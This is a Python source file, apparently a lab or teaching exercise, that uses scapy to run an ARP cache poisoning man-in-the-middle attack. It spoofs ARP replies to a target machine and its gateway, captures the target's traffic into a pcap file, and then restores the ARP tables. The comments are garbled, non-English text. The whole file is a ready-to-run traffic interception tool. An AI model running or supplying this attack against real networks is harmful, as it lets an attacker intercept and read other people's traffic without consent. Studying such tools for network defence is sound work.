#coding=utf-8
from scapy.all import *
import os
import sys
import threading

interface   = "eth0"              #�n�屴�����d
target_ip   = "10.10.10.130"      #�ؼ�ip,�o�̴��ժ��O�t�~�@�x������win7
gateway_ip  = "10.10.10.2"        #����ip�A�o�̬O������������
packet_count = 1000
poisoning    = True

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):

    # �H�U�N�X�ե�send��ƪ��覡�y�����P
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

def get_mac(ip_address):
    # srp��ơ]�o�e�M�����ƾڥ]�A�o�e���wARP�ШD����wIP�a�},�M��q��^���ƾڤ�����ؼ�ip��mac�^
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    #�@��^�q�T���ƾڤ������MAC�a�}
    for s,r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning

    # �c�ش��F�ؼЪ�ARP�ШD()�A�o�̨S�]�mhwsrc,�q�{�N�O������
    # ²��ӻ��G�i�D�Q���������A�����]�������^��mac�O�����A�N�O�����̪������O����
    poison_target = ARP()
    poison_target.op = 2                # �T������
    poison_target.psrc = gateway_ip     # �����O�����o�X��, ���O�ڭ̪������o�X��
    poison_target.pdst = target_ip      # �ت��a�O�ؼо���
    poison_target.hwdst = target_mac    # �ؼЪ����z�a�}�O�ؼо�����mac

    # �c�ش��F������ARP�ШD()�A�o�̨S�]�mhwsrc,�q�{�N�O������
    poison_gateway = ARP()
    poison_gateway.op = 2               # �T������
    poison_gateway.psrc = target_ip     # �����O�ؼо����o�X��,
    poison_gateway.pdst = gateway_ip    # �ت��a�O����
    poison_gateway.hwdst = gateway_mac  # �ؼЪ����z�a�}�O������mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while poisoning:
        # �}�l�o�eARP���F�](��r)
        send(poison_target)
        send(poison_gateway)
        # �����
        time.sleep(2)

    print "[*] ARP poison attack finished."

    return

# �]�m�屴�����d
conf.iface = interface

# ������X
conf.verb  = 0

print "[*] Setting up %s" % interface
# �������mac
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!!!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
# ����ؼ�(�Q����������)mac
target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!!!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip,target_mac)

# �Ұ�ARP��r�]���F�^�u�{
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count

    bpf_filter  = "ip host %s" % target_ip  # �L�o��
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

except KeyboardInterrupt:
    pass

finally:
    # �N����쪺�ƾڥ]��X����
    print "[*] Writing packets to arper.pcap"
    wrpcap('arper.pcap',packets)

    poisoning = False

    # ���ݧ�r�i�{�h�X
    time.sleep(2)

    # �٭�����t�m
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)